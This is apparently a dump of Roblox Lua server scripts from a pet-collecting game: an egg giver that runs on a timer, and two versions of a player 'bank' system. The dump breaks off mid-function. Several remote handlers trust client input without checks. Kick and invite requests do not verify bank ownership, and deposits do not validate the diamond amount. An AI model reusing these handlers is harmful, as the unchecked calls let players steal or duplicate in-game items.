         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
           
           Gives an Exclusive Egg every x seconds
           This basically is just a thing for f2p players,
           the system for this is super simple.
--]]


--------|     Setting     |--------
local TimeNeeded = 900
local UNITSECOND = 1
local UNITMINUTE = 60
local UNITHOUR = 3600
local Hours = 1
local Minutes = 0
local Seconds = 0
local ExclusiveEgg = "1030"

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------


--[[

-- OLD
function GetTime()
	local HOURSTOSECONDS = ((UNITHOUR * (Hours > 0 and Hours or 1)))
	HOURSTOSECONDS =  HOURSTOSECONDS > UNITHOUR and HOURSTOSECONDS or 0
	local MINUTESTOSECONDS = ((UNITMINUTE * (Minutes > 0 and Minutes or 1)))
	MINUTESTOSECONDS =  MINUTESTOSECONDS > UNITMINUTE and MINUTESTOSECONDS or 0
	local SECONDS = ((UNITSECOND * (Seconds > 0 and Seconds or 1)))
	SECONDS =  SECONDS > UNITSECOND and SECONDS or 0
	return MINUTESTOSECONDS + HOURSTOSECONDS + SECONDS
end

--]]

function GetTime()
	local HOURSTOSECONDS = UNITHOUR * Hours 
	local MINUTESTOSECONDS = UNITMINUTE * Minutes 
	local SECONDS = UNITSECOND * Seconds
	
	HOURSTOSECONDS = HOURSTOSECONDS >= UNITHOUR and HOURSTOSECONDS or 0
	MINUTESTOSECONDS = MINUTESTOSECONDS >= UNITMINUTE and MINUTESTOSECONDS or 0
	SECONDS = SECONDS >= UNITSECOND and SECONDS or 0
	
	return MINUTESTOSECONDS + HOURSTOSECONDS + SECONDS
end

_L.Signal.Fired("Player Added"):Connect(function(player)
	local save = _L.Saving.Get(player)
	if save then
		task.spawn(function()
			local TIMETOWAIT = GetTime()
			while task.wait(TIMETOWAIT) do
				_L.Pets.Create(player, ExclusiveEgg)
				_L.Network.Fire("Notification", player, "You recieved a FREE Exclusive Egg!",{
					color = Color3.fromRGB(221, 85, 255),
					force = true
				})
			end
		end)
	end
end)

--[[_L.Signal.Fired('Player Added'):Connect(function(player)
	local save = _L.Saving.Get(player)
	save["LastExclCheck"] = os.clock() -- 7uoy
	if save then
		while task.wait() do
			local lastCheck = save["LastExclCheck"] or os.clock()
			if lastCheck - os.clock() >= TimeNeeded then
				_L.Pets.Create(player, "1030")
				_L.Network.Fire("Notification", player, "You recieved a FREE Exclusive Egg!",{
					color = Color3.fromRGB(221, 85, 255),
					force = true
				})
				save["LastExclCheck"] = os.clock()
			end
		end
	end
end)]]--  -  Editar
  04:54:13.777    -  Editar
  04:54:13.777  ----- [2366] ServerScriptService.Scripts.Game.BankServer [SCRAPPED] -----  -  Editar
  04:54:13.777  --- Started to rescript 08/19/2023
--- Whole script scripted by OneX

--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------

--------|    Variables    |--------
local datastore = _L.DataStoreService:GetDataStore("Bank".._L.Settings.StatsVersion)
local UPDATING = {Bank = false,Player = false}
local TOKENS = {Player = 0,Bank = 0}

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-- bank cache will hold all bank/player data
_G.BANKCACHE = {PLAYER = {},BANK  = {}}

-- GetBank(BUID)
-- return {Storage, Owner, BUID, Tier, Players, History, Banned}
function GetBank(buid)
	local cachebank = _G.BANKCACHE.BANK[buid]
	if cachebank then
		return cachebank
	end
	
	local success, data = pcall(function()
		return datastore:GetAsync(buid)
	end)
	
	if not success then
		print("GetBank: Failed to get bank "..buid)
		return
	end
	
	if data == nil then
		local def = _G.GetDefaultData("bank")
		local encode = _L.HttpService:JSONEncode(def)
		if not encode then
			print("GetBank: Failed to encode default "..encode)
			return
		end
		
		datastore:SetAsync(buid, encode)
		_G.BANKCACHE.BANK[buid] = def
	else
		local decode = _L.HttpService:JSONDecode(data)
		if not decode then
			print("GetBank: Failed to decode data "..data)
			return
		end
		_G.BANKCACHE.BANK[buid] = decode
	end
	return _G.BANKCACHE.BANK[buid]
end



-- UpdateBank(BUID, {Storage, Owner, BUID, Tier, Players, History, Banned}, 1)
-- return true
function UpdateBank(buid, data, token)
	while UPDATING.Bank do
		_L.Heartbeat()
	end
	
	UPDATING.Bank = true
	if token < TOKENS.Bank then
		print("UpdateBank: token > "..token)
		UPDATING.Bank = false
		return false
	end
	
	local success, _error = pcall(function()
		datastore:UpdateAsync(buid, function(old)
			old = _L.HttpService:JSONDecode(old)
			if not old then
				print("UpdateBank: Failed to decode old "..old)
				UPDATING.Bank = false
				return false
			end 
			
			for var, dat in pairs(data) do
				old[var] = dat
			end
			--
			table.sort(old.History, function(var1, var2)
				return var1.ts > var2.ts
			end)
			
			old = _L.HttpService:JSONEncode(old)
			if not old then
				print("UpdateBank: Failed to encode old "..old)
				UPDATING.Bank = false
				return false
			end
			return old
		end)
	end)
	
	if not success then
		print("Updatebank: Failed to update ".._error)
		return false
	end
	
	UPDATING.Bank = false 
	TOKENS.Bank = TOKENS.Bank + 1
	return true
end

-- GetPlayer(userid)
-- return {Banks, Invites, OutgoingInvites}
function GetPlayer(id)
	if type(id) ~= "number" then
		if type(id) == "string" then
			id = tonumber(id)
		else
			id = id.UserId
		end
	end
	
	id = tostring(id)
	
	local cacheplayer = _G.BANKCACHE.PLAYER[id]
	if cacheplayer then
		return cacheplayer
	end

	local success, data = pcall(function()
		return datastore:GetAsync(id)
	end)
	
	if not success then
		print("GetPlayer: Failed to get player "..data)
		return
	end

	if data == nil then
		local def = _G.GetDefaultData("player")
		local encode = _L.HttpService:JSONEncode(def)
		if not encode then
			print("GetPlayer: Failed to encode default "..encode)
			return
		end

		datastore:SetAsync(id, encode)
		_G.BANKCACHE.PLAYER[id] = def
	else
		local decode = _L.HttpService:JSONDecode(data)
		if not decode then
			print("GetPlayer: Failed to decode data "..data)
			return
		end
		_G.BANKCACHE.PLAYER[id] = decode
	end
	return _G.BANKCACHE.PLAYER[id]
end

-- UpdatePlayer(userid, {Banks, Invites, OutgoingInvites}, 1)
-- return true
function UpdatePlayer(id, data, token)
	if type(id) ~= "number" then
		if type(id) == "string" then
			id = tonumber(id)
		else
			id = id.UserId
		end
	end

	id = tostring(id)
	
	while UPDATING.Player do
		_L.Heartbeat()
	end

	UPDATING.Player = true
	if token < TOKENS.Player then
		print("UpdatePlayer: token > "..token)
		UPDATING.Player = false
		return false
	end

	local success, _error = pcall(function()
		datastore:UpdateAsync(id, function(old)
			old = _L.HttpService:JSONDecode(old)
			if not old then
				print("UpdatePlayer: Failed to decode old "..old)
				UPDATING.Player = false
				return false
			end 

			for var, dat in pairs(data) do
				old[var] = dat
			end

			old = _L.HttpService:JSONEncode(old)
			if not old then
				print("UpdatePlayer: Failed to encode old "..old)
				UPDATING.Player = false
				return false
			end
			return old
		end)
	end)

	if not success then
		print("UpdatePlayer: Failed to update ".._error)
		return false
	end

	UPDATING.Player = false 
	TOKENS.Player = TOKENS.Player + 1
	return true
end

-- UpdatePlayer()
-- return buid-1F9BF2459FCC4A049623A395573A90D1
function GenerateBUID()
	local uid = _L.Functions.GenerateUID()
	if not uid then
		print("GenerateBUID: Failed to generate BUID "..uid)
		return nil
	end
	return "buid-"..uid
end

-- UpdatePlayer()
-- return buid-1F9BF2459FCC4A049623A395573A90D1
function CreateBank(id)
	if type(id) ~= "number" then
		if type(id) == "string" then
			id = tonumber(id)
		else
			id = id.UserId
		end
	end
	
	local buid = GenerateBUID()
	local def = _G.GetDefaultData("bank")
	def["Owner"] = id
	def["BUID"] = buid
	
	_G.BANKCACHE.BANK[buid] = def
	return buid
end

----------------------------------------------------------------------------------------------------------------------------

_L.Network.Invoked("Get Bank").OnInvoke = function(plr, buid)
	local bData = GetBank(buid)
	if not bData then
		return false, buid
	end
	if bData.Banned then
		return false, "banned"
	end
	return bData
end

_L.Network.Invoked("Get My Banks").OnInvoke = function(plr)
	local pData = GetPlayer(plr)
	if not pData then
		return false, plr.UserId
	end
	local banks = {}
	for _, buid in ipairs(pData.Banks) do
		local bData = GetBank(buid)
		if not bData then
			return false, plr.UserId
		end
		table.insert(banks, bData)
	end
	return banks
end

_L.Network.Invoked("Get Bank Invites").OnInvoke = function(plr)
	local pData = GetPlayer(plr)
	if not pData then
		return false, plr.UserId
	end
	return pData.Invites
end


-- This saves Bank/Player data 
game.Players.PlayerRemoving:Connect(function(player: Player)
	
end)
  -  Editar
  04:54:13.777    -  Editar
  04:54:13.777  ----- [2367] ServerScriptService.Scripts.Game.BankServer [OLD] -----  -  Editar
  04:54:13.777  --[[

                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
    By: @localonex     

	Re-scripted this 07/04/23 - @localonex
		
	Update 7/16/2023:
	Added player DS due to some stuff not working
	with both bank and player data on the same ds
	
	Update 7/22-23/2023:
	Removed player DS
	Added Json Encode/Decode
		
		
--]]

--------|     Setting     |--------
local bankCost = 7500000
local MaxInvites = 50
local MaxBanks = 5
local Debug = false --game:GetService("RunService"):IsStudio()
local DataDebug = game:GetService("RunService"):IsStudio()

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------
local HttpService = game:GetService("HttpService")

--------|    Variables    |--------
local DB = _L.DataStoreService:GetDataStore("bank:".._L.Settings.StatsVersion.._L.Settings.BankVersion)
--local PLAYERDS = _L.DataStoreService:GetDataStore("bankplayer-".._L.Settings.StatsVersion.._L.Settings.BankVersion)
local UPDATINGBANK = false


--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------



function GetBank(BUID)
	repeat task.wait()
	until not UPDATINGBANK

	local data = nil
	local s, e = pcall(function()
		data = DB:GetAsync(BUID)
	end) 

	if not s then
		_L.Print("[bold] HUGE ERROR "..e.." | BANK [/bold]")
		return nil
	end

	if data == nil then
		local defData = _G.GetDefaultData("bank")
		DB:SetAsync(BUID, HttpService:JSONEncode(defData))

		if Debug then
			print(defData)
		end	
		return defData
	end

	local decoded = HttpService:JSONDecode(data)
	if Debug then
		print(decoded,data)
	end	

	return decoded or nil
end

function UpdateBank(BUID, newData)	
	local data = GetBank(BUID)
	UPDATINGBANK = true

	if data == nil then
		_L.Print("[bold] ERROR WITH UPDATING BANK "..BUID.."[/bold]")
		UPDATINGBANK = false
		return
	end

	local s, e = pcall(function()
		DB:UpdateAsync(BUID, function(oldData)
			oldData = HttpService:JSONDecode(oldData)

			for i, v in pairs(newData) do
				if Debug then
					print(newData,oldData,"DATA")
				end	
				if i == "Players" or not oldData[i] then
					if Debug then
						print(i,v)
					end	
				end
				oldData[i] = v
			end

			table.sort(oldData.History, function(i, v)
				return i.ts > v.ts
			end)

			return HttpService:JSONEncode(oldData)  
		end)
	end)

	UPDATINGBANK = false

	if not s then
		_L.Print("[bold] ERROR WITH UPDATING BANK "..BUID.." reason: "..e.."[/bold]")
		return false
	end

	return true
end

function GetPlayer(player)
	local UserId = player
	if type(player) ~= "number" then
		UserId = player.UserId
	end

	UserId = tostring(UserId)

	local data = nil
	local s, e = pcall(function()
		data = DB:GetAsync(UserId)
	end) 

	if not s then
		_L.Print("[bold] HUGE ERROR "..e.." | BANK [/bold]")
		return nil
	end

	if data == nil then
		local defData = _G.GetDefaultData("player")
		DB:SetAsync(UserId, HttpService:JSONEncode(defData))

		return defData
	end

	return HttpService:JSONDecode(data)
end

function UpdatePlayer(player, newData)
	local UserId = player
	if type(player) ~= "number" then
		UserId = player.UserId
	end

	UserId = tostring(UserId)

	local data = GetPlayer(UserId)

	if data == nil then
		_L.Print("[bold] ERROR WITH UPDATING PLYRS BANK DATA "..UserId.."[/bold]")
		return
	end

	local s, e = pcall(function()
		DB:UpdateAsync(UserId, function(oldData)
			oldData = HttpService:JSONDecode(oldData)

			for i, v in pairs(newData) do
				if Debug then
					print(newData,oldData,"DATA")
				end
				oldData[i] = v
			end

			return HttpService:JSONEncode(oldData)  
		end)
	end)

	if not s then
		_L.Print("[bold] ERROR WITH UPDATING PLYRS BANK DATA "..UserId.." reason: "..e.."[/bold]")
		return false
	end

	return true
end

function GenerateBUID() -- 
	local UID = _L.Functions.GenerateUID()

	return "bank-"..UID
end

function CreateBank(owner)
	local BUID = GenerateBUID()

	UpdateBank(BUID, {
		Owner = owner,
		BUID = BUID,
		Players =  {}
	})
	if DataDebug then
		print("UpdateBank: CreateBank",os.time())
	end


	if Debug then
		print("Created Bank: "..BUID, "Owner by: "..owner)
	end

	return BUID
end

-----------------------------------------------------------------------------------------------

_L.Network.Invoked("Get Bank").OnInvoke = function(plyr, BUID)
	local bankData = GetBank(BUID)

	if not bankData then
		if Debug then
			print("Failed to get bank",BUID,plyr)
		end
		return false, BUID
	end

	if bankData.Banned == true then
		if Debug then
			print("Bank: "..BUID.." is Banned.")
		end
		return false, "banned"
	end

	if Debug then
		print("Got "..plyr.Name.."'s Bank, BUID: ",BUID,"Data:",bankData)
	end

	return bankData 
end

_L.Network.Invoked("Get My Banks").OnInvoke = function(plyr)
	local plrData = GetPlayer(plyr)

	if not plrData or not plrData.Banks then
		return false, plyr.UserId
	end

	local banks = {}

	for _, BUID in ipairs(plrData.Banks) do
		local bankData = GetBank(BUID)

		if not bankData then
			print("Failed to grab",plyr.."'s Banks")
			return false, plyr.UserId
		end

		table.insert(banks, bankData)
	end

	if Debug then
		print("Got "..plyr.Name.." Banks",banks)
	end

	return banks
end

_L.Network.Invoked("Get Bank Invites").OnInvoke = function(plyr)
	local plrData = GetPlayer(plyr)

	if not plrData or not plrData.Invites then
		if Debug then
			print("Failed to grab",plyr.Name.."'s Invites")
		end	
		return false, plyr.UserId
	end

	if Debug then
		print("Got "..plyr.Name.." :",plrData)
	end

	return plrData.Invites
end

----

_L.Network.Invoked("Buy Bank").OnInvoke = function(plyr)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100)then
		return false, "You're too far from the bank!"
	end

	local save = _L.Saving.Get(plyr)
	if not save then
		return nil
	end

	if save.Diamonds < bankCost then
		return false, "You need ".._L.Functions.Commas(bankCost-save.Diamonds).." more Diamonds! (Code: 100)"
	end

	local plrData = GetPlayer(plyr)
	if not plrData then
		return false
	end

	if plrData["MyBank"] ~= nil then
		return false, "You already own a bank!"
	end

	local BUID = CreateBank(plyr.UserId)
	table.insert(plrData.Banks, BUID)
	plrData["MyBank"] = BUID
	UpdatePlayer(plyr, plrData)

	save.Diamonds = save.Diamonds - bankCost

	if Debug then
		print(plrData)
	end

	_L.Achievements.Add(plyr, "Open Bank", 1)
	return true, BUID
end

_L.Network.Invoked("Upgrade Bank").OnInvoke = function(plyr, BUID) 
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100)then
		return false, "You're too far from the bank!"
	end

	local bankData = GetBank(BUID)
	if not bankData then
		return
	end

	local newDir = _L.Directory.Banks[bankData.Tier+1]
	if bankData.Tier == 8 then
		return false, "Your bank is already max!"
	end

	local diamonds = bankData.Storage.Currency.Diamonds
	if diamonds < newDir.Cost then
		return false, "Bank needs ".._L.Functions.Commas(newDir.Cost-diamonds).." more Diamonds to upgrade! (Code: 100)"
	end

	bankData.Storage.Currency.Diamonds = bankData.Storage.Currency.Diamonds - newDir.Cost
	bankData.Tier = bankData.Tier + 1

	_L.Achievements.Add(plyr, "Upgrade Bank", 1)

	table.insert(bankData.History, { 
		kind = 7, 
		ts = workspace:GetServerTimeNow(),  
		newLevel = bankData.Tier 
	})

	UpdateBank(BUID, bankData)
	if DataDebug then
		print("UpdateBank: Upgrade Bank",os.time(),bankData)
	end

	if Debug then
		print(BUID,bankData)
	end

	return true
end

_L.Network.Invoked("Bank Deposit").OnInvoke = function(plyr, BUID, pets, diamonds)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100)then
		return false, "You're too far from the bank!"
	end

	local save = _L.Saving.Get(plyr)
	if not save then
		return nil, "no save"
	end

	local bankData = GetBank(BUID)
	if not bankData then
		return nil, "no bank"
	end

	local plrData = GetPlayer(plyr)
	if not plrData then
		return
	end

	if not table.find(plrData.Banks, BUID) then
		return false, "Youre not a member of this bank!"
	end

	local bankStorage = bankData.Storage

	if #save.Pets - #pets < 1 then
		return false, "You need at least 1 pet in your inventory at all times!"
	end

	if save.Diamonds - diamonds < 0 then
		return false, "You do not have enough Diamonds to deposit this much!"
	end

	local dir = _L.Directory.Banks[bankData.Tier]
	if dir.PetSlots < #bankStorage.Pets + #pets then
		return false, "Your bank can only hold "..dir.PetSlots-#bankStorage.Pets.." more Pets!"
	end

	if dir.MaxDiamonds < bankStorage.Currency.Diamonds + diamonds then
		return false, "Your bank can only hold ".._L.Functions.Commas(dir.MaxDiamonds-bankStorage.Currency.Diamonds).." more Diamonds!"
	end

	if #pets > 0 then
		for _, uid in ipairs(pets) do
			local pet = _L.Pets.Get(uid)
			if not pet or not pet.uid then
				return nil, "no pet"
			end

			if plrData['MyBank']~= BUID then
				if pet.l then
					return false, "You cant deposit locked pets into other peoples banks!"
				end
			end
		end	

		for _, uid in ipairs(pets) do
			local pet = _L.Pets.Get(uid)
			if not pet or not pet.uid then
				return nil, "no pet"
			end

			_L.Pets.Unequip(uid)
			_L.Pets.Delete(uid)
			table.insert(bankStorage.Pets, pet)
		end
	end

	if diamonds > 0 then
		save.Diamonds = save.Diamonds - diamonds
		bankStorage.Currency.Diamonds = bankStorage.Currency.Diamonds + diamonds
	end

	table.insert(bankData.History, { 
		kind = 1, 
		ts = workspace:GetServerTimeNow(),  
		sender = plyr.UserId, 
		pets = #pets, 
		diamonds = diamonds 
	})

	UpdateBank(BUID, bankData)
	if DataDebug then
		print("UpdateBank: Deposit",os.time(),bankData)
	end

	if Debug then
		print(BUID,bankData)
	end

	return true
end

_L.Network.Invoked("Bank Withdraw").OnInvoke = function(plyr, BUID, pets, diamonds)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100)then
		return false, "You're too far from the bank!"
	end

	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	local bankData = GetBank(BUID)
	if not bankData then
		return
	end

	local plrData = GetPlayer(plyr)
	if not plrData then
		return
	end

	if typeof(pets) ~= "table" or typeof(diamonds) ~= "number" then
		return
	end

	if not table.find(plrData.Banks, BUID) then
		return false, "You're not a member of this bank!"
	end

	local bankStorage = bankData.Storage

	if #save.Pets + #pets > save.MaxSlots then
		return false, "You do not have enough inventory space!"
	end

	if save.Diamonds + diamonds > _L.Directory.Currency.Diamonds.Limit then
		return false, "You can't hold any more diamonds!"
	end

	local dir = _L.Directory.Banks[bankData.Tier]

	if #pets > 0 then
		for _, uid in ipairs(pets) do
			for index, pet in ipairs(bankStorage.Pets) do
				if uid == pet.uid then
					if pet.l then
						if plrData["MyBank"]~= BUID then
							return false, "You cant withdraw other peoples locked pets!"
						end
					end
				end
			end
		end

		for _, uid in ipairs(pets) do
			for index, pet in ipairs(bankStorage.Pets) do
				if uid == pet.uid then
					table.remove(bankStorage.Pets, index)
					_L.Pets.Create(plyr, pet.id, pet, nil, true)
				end
			end
		end
	end

	if diamonds > 0 then
		--save.Diamonds = save.Diamonds + diamonds
		_L.Give.Currency(plyr, diamonds, "Diamonds")
		bankStorage.Currency.Diamonds = bankStorage.Currency.Diamonds - diamonds
	end

	table.insert(bankData.History, { 
		kind = 2,
		ts = workspace:GetServerTimeNow(),
		sender = plyr.UserId, 
		pets = #pets, 
		diamonds = diamonds 
	})

	UpdateBank(BUID, bankData)
	if DataDebug then
		print("UpdateBank: withdraw",os.time(),bankData)
	end

	if Debug then
		print(BUID,bankData)
	end

	return true
end

_L.Network.Invoked("Invite To Bank").OnInvoke = function(plyr, BUID, target)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100)then
		return false, "You're too far from the bank!"
	end

	local plrData = GetPlayer(target)
	if not plrData then
		return
	end

	local bankData = GetBank(BUID)
	if not bankData then
		return
	end

	for _, data in ipairs(plrData.Invites) do
		if data.BUID == BUID then
			return false, "You have already sent a invite to this player!"
		end
	end

	for _, data in ipairs(plrData.Banks) do
		if data.BUID == BUID then
			return false, "This player is already in your bank!"
		end
	end

	if #plrData.Invites >= MaxInvites then
		return false, "This player has the max amount of invites!"
	end

	local dir = _L.Directory.Banks[bankData.Tier]
	if dir.MaxPlayers <= #bankData.Players+1 then -- +1 adds owner
		return false, "Your bank cannot hold any more players!"
	end

	local invData = _G.GetDefaultData("invite")
	invData.BUID = BUID
	invData.Sender = plyr.UserId

	local pData = GetPlayer(plyr)
	if pData then
		table.insert(pData.OutgoingInvites, tostring(target))
	end	

	table.insert(plrData.Invites, invData)
	table.insert(bankData.History, { 
		kind = 3, 
		ts = workspace:GetServerTimeNow(),  
		target = target, 
		sender = plyr.UserId 
	})

	UpdateBank(BUID, bankData)
	if DataDebug then
		print("UpdateBank: invite",os.time(),bankData)
	end

	UpdatePlayer(target, plrData)

	return true
end

_L.Network.Invoked("Kick From Bank").OnInvoke = function(plyr, BUID, target)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100)then
		return false, "You're too far from the bank!"
	end

	local plrData = GetPlayer(target)
	if not plrData then
		return
	end

	local bankData = GetBank(BUID)
	if not bankData then
		return
	end

	for i, v in ipairs(bankData.Players) do
		if v == target then
			table.remove(bankData.Players, i)
		end
	end

	for i, v in ipairs(plrData.Banks) do
		if v == BUID then
			table.remove(plrData.Banks, i)
		end
	end

	table.insert(bankData.History, {
		kind = 4, 
		ts = workspace:GetServerTimeNow(), 
		target = target,
		sender = plyr.UserId 
	})


	UpdatePlayer(target, plrData)
	UpdateBank(BUID, bankData)
	if DataDebug then
		print("UpdateBank: kick bank",os.time(),bankData)
	end

	return true
end

_L.Network.Invoked("Leave Bank").OnInvoke = function(plyr, BUID)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100)then
		return false, "You're too far from the bank!"
	end

	local plrData = GetPlayer(plyr)
	if not plrData then
		return
	end

	local bankData = GetBank(BUID)
	if not bankData then
		return
	end

	for i, v in ipairs(bankData.Players) do
		if v == plyr.UserId then
			table.remove(bankData.Players, i)
		end
	end

	for i, v in ipairs(plrData.Banks) do
		if v == BUID then
			table.remove(plrData.Banks, i)
		end
	end

	table.insert(bankData.History, {
		kind = 5, 
		ts = workspace:GetServerTimeNow(), 
		target = plyr,
		sender = plyr.UserId 
	})


	UpdatePlayer(plyr, plrData)
	UpdateBank(BUID, bankData)
	if DataDebug then
		print("UpdateBank: leave bank",os.time(),bankData)
	end

	return true
end

_L.Network.Invoked("Accept Bank Invite").OnInvoke = function(plyr, BUID)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100)then
		return false, "You're too far from the bank!"
	end

	local plrData = GetPlayer(plyr)
	if not plrData then
		return
	end

	local bankData = GetBank(BUID)
	if not bankData then
		return
	end

	if #plrData.Banks >= MaxBanks then
		return false, "You already are in the max amount of banks!"
	end

	for i, v in ipairs(plrData.Invites) do
		if v.BUID == BUID then
			table.remove(plrData.Invites, i)
			-- check if plyr is already in bank
			for i,v in ipairs(plrData.Banks) do
				if v==BUID then
					return false, "You're already in this bank!"
				end
			end
		end
	end

	table.insert(plrData.Banks, BUID)
	--table.insert(bankData.Players, plyr.UserId)
	table.insert(bankData.Players, plyr.UserId)
	--bankData.Players[(#bankData.Players)+1] = plyr.UserId

	local senderData = GetPlayer(bankData.Owner)
	if not senderData then
		return
	end

	table.remove(senderData, plyr.UserId)


	table.insert(bankData.History, {
		kind = 6, 
		ts = workspace:GetServerTimeNow(), 
		target = plyr,
	})


	if Debug then
		print(bankData,plrData)
		warn(bankData.Players,"PLAYER")
	end

	UpdatePlayer(plyr, plrData)
	UpdateBank(BUID, bankData)
	if DataDebug then
		print("UpdateBank: accept invite",os.time(),bankData)
	end

	return true
end

_L.Network.Invoked("Decline All Bank Invites").OnInvoke = function(plyr)
